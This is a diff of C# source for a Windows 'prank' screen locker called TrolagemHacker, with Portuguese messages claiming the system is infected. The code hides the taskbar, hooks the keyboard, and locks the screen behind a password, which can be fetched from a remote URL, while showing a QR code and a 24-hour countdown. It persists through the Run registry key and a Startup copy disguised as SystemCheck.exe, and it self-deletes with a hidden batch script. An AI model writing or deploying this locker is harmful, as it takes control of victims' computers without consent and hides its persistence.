@@ -62,55 +62,94 @@ public class TrolagemHacker : Form
         this.ShowInTaskbar = false;
         this.DoubleBuffered = true;
 
-        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
-        int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+        int sw = Screen.PrimaryScreen.Bounds.Width;
+        int sh = Screen.PrimaryScreen.Bounds.Height;
 
-        // --- IMAGEM HACKER (TOPO) ---
+        // ============================================================
+        // DOWNLOAD DAS IMAGENS PARA DISCO (MÉTODO SEGURO)
+        // ============================================================
+        string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
+        if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);
+        string hackerPath = Path.Combine(tempFolder, "hacker.png");
+        string qrPath = Path.Combine(tempFolder, "qr.png");
+
+        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+        WebClient client = new WebClient();
+
+        // Baixar imagem do hacker
+        try { client.DownloadFile(URL_HACKER, hackerPath); } catch {}
+        // Baixar QR Code
+        try { client.DownloadFile(URL_QRCODE, qrPath); } catch {}
+
+        // ============================================================
+        // IMAGEM HACKER (TOPO)
+        // ============================================================
         PictureBox pbHacker = new PictureBox();
+        pbHacker.BackColor = Color.Black;
         pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
         pbHacker.Size = new Size(180, 180);
-        pbHacker.Location = new Point((screenWidth - 180) / 2, 20);
+        pbHacker.Location = new Point((sw - 180) / 2, 15);
+        if (File.Exists(hackerPath)) {
+            pbHacker.ImageLocation = hackerPath;
+        }
         this.Controls.Add(pbHacker);
 
-        // --- TÍTULO ---
+        // ============================================================
+        // TÍTULO
+        // ============================================================
         Label lblTitulo = new Label();
         lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO PELO VÍRUS 'CURIOSO_V1.0'";
         lblTitulo.ForeColor = Color.Red;
         lblTitulo.Font = new Font("Courier New", 22, FontStyle.Bold);
         lblTitulo.TextAlign = ContentAlignment.MiddleCenter;
-        lblTitulo.Size = new Size(screenWidth, 60);
-        lblTitulo.Location = new Point(0, 210);
+        lblTitulo.Size = new Size(sw, 60);
+        lblTitulo.Location = new Point(0, 200);
         this.Controls.Add(lblTitulo);
 
-        // --- TEXTO ZOEIRA ---
+        // ============================================================
+        // TEXTO ZOEIRA
+        // ============================================================
         Label lblTexto = new Label();
-        lblTexto.Text = "Parece que alguem andou clicando onde nao devia, hein? O Windows detectou um nivel critico de 'curiosidade excessiva' e decidiu tirar ferias por 24 horas.\n\n" +
+        lblTexto.Text = "Parece que alguem andou clicando onde nao devia, hein?\n" +
+                        "O Windows detectou um nivel critico de 'curiosidade excessiva'\n" +
+                        "e decidiu tirar ferias por 24 horas.\n\n" +
                         "STATUS DO SISTEMA:\n" +
-                        "- Barra de tarefas: SEQÜESTRADA\n" +
+                        "- Barra de tarefas: SEQUESTRADA\n" +
                         "- Area de trabalho: DELETADA (BRINCADEIRINHA... OU NAO)\n" +
                         "- Gerenciador de tarefas: EM GREVE\n\n" +
-                        "Se voce quiser ver sua area de trabalho de novo hoje, vai ter que adivinhar a senha secreta. Dica: Voce nunca vai acertar kkkkkk. Digite a chave abaixo se tiver coragem!";
+                        "Se voce quiser ver sua area de trabalho de novo hoje,\n" +
+                        "vai ter que adivinhar a senha secreta.\n" +
+                        "Dica: Voce nunca vai acertar kkkkkk.\n" +
+                        "Digite a chave abaixo se tiver coragem!";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 11, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
-        lblTexto.Size = new Size(800, 220);
-        lblTexto.Location = new Point((screenWidth - 800) / 2, 270);
+        lblTexto.Size = new Size(800, 230);
+        lblTexto.Location = new Point((sw - 800) / 2, 265);
         this.Controls.Add(lblTexto);
 
-        // --- QR CODE (VISÍVEL) ---
+        // ============================================================
+        // QR CODE (SEMPRE VISÍVEL)
+        // ============================================================
         PictureBox pbQR = new PictureBox();
+        pbQR.BackColor = Color.Black;
         pbQR.SizeMode = PictureBoxSizeMode.Zoom;
         pbQR.Size = new Size(120, 120);
-        pbQR.Location = new Point((screenWidth - 120) / 2, 500);
+        pbQR.Location = new Point((sw - 120) / 2, 500);
+        if (File.Exists(qrPath)) {
+            pbQR.ImageLocation = qrPath;
+        }
         this.Controls.Add(pbQR);
 
-        // --- CAMPO SENHA ---
+        // ============================================================
+        // CAMPO SENHA + BOTÃO
+        // ============================================================
         txtChave = new TextBox();
         txtChave.PasswordChar = '*';
         txtChave.Font = new Font("Arial", 18);
         txtChave.TextAlign = HorizontalAlignment.Center;
         txtChave.Size = new Size(250, 40);
-        txtChave.Location = new Point((screenWidth - 250) / 2, 630);
+        txtChave.Location = new Point((sw - 250) / 2, 635);
         this.Controls.Add(txtChave);
 
         btnDesbloquear = new Button();
@@ -119,18 +158,20 @@ public class TrolagemHacker : Form
         btnDesbloquear.FlatStyle = FlatStyle.Flat;
         btnDesbloquear.Font = new Font("Arial", 11, FontStyle.Bold);
         btnDesbloquear.Size = new Size(250, 45);
-        btnDesbloquear.Location = new Point((screenWidth - 250) / 2, 680);
+        btnDesbloquear.Location = new Point((sw - 250) / 2, 685);
         btnDesbloquear.Click += (s, e) => VerificarChave();
         this.Controls.Add(btnDesbloquear);
 
-        // --- CRONÔMETRO ---
+        // ============================================================
+        // CRONÔMETRO 24H
+        // ============================================================
         tempoFinal = DateTime.Now.AddHours(24);
         lblCronometro = new Label();
         lblCronometro.ForeColor = Color.Lime;
         lblCronometro.Font = new Font("Courier New", 24, FontStyle.Bold);
-        lblCronometro.Size = new Size(screenWidth, 50);
+        lblCronometro.Size = new Size(sw, 50);
         lblCronometro.TextAlign = ContentAlignment.MiddleCenter;
-        lblCronometro.Location = new Point(0, screenHeight - 100);
+        lblCronometro.Location = new Point(0, sh - 90);
         this.Controls.Add(lblCronometro);
 
         timerRelogio = new System.Windows.Forms.Timer();
@@ -141,19 +182,9 @@ public class TrolagemHacker : Form
         };
         timerRelogio.Start();
 
-        // --- DOWNLOAD DAS IMAGENS ---
-        using (WebClient client = new WebClient()) {
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            try {
-                byte[] imgData = client.DownloadData(URL_HACKER);
-                using (var ms = new MemoryStream(imgData)) { pbHacker.Image = Image.FromStream(ms); }
-            } catch {}
-            try {
-                byte[] qrData = client.DownloadData(URL_QRCODE);
-                using (var ms = new MemoryStream(qrData)) { pbQR.Image = Image.FromStream(ms); }
-            } catch {}
-        }
-
+        // ============================================================
+        // PERSISTÊNCIA
+        // ============================================================
         try {
             string exePath = Application.ExecutablePath;
             RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
@@ -162,6 +193,9 @@ public class TrolagemHacker : Form
             if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
         } catch {}
 
+        // ============================================================
+        // PROTEÇÃO
+        // ============================================================
         ControlarBarraTarefas(false);
 
         timerProtecao = new System.Windows.Forms.Timer();
@@ -188,7 +222,11 @@ public class TrolagemHacker : Form
 
     private void VerificarChave() {
         string senhaGitHub = "";
-        try { using (WebClient client = new WebClient()) { senhaGitHub = client.DownloadString(URL_SENHA).Trim(); } } catch {}
+        try {
+            WebClient wc = new WebClient();
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            senhaGitHub = wc.DownloadString(URL_SENHA).Trim();
+        } catch {}
 
         if (txtChave.Text == SENHA_MESTRA || (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {
             UnhookWindowsHookEx(_hookID);
@@ -200,6 +238,11 @@ public class TrolagemHacker : Form
                 string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
                 if (File.Exists(startupPath)) File.Delete(startupPath);
 
+                // Limpar imagens temporárias
+                string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
+                if (Directory.Exists(tempFolder)) Directory.Delete(tempFolder, true);
+
+                // Autodestruição
                 string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
                 File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + Application.ExecutablePath + "\"\ndel /f /q \"%~f0\"\nexit");
                 Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"") { WindowStyle = ProcessWindowStyle.Hidden });
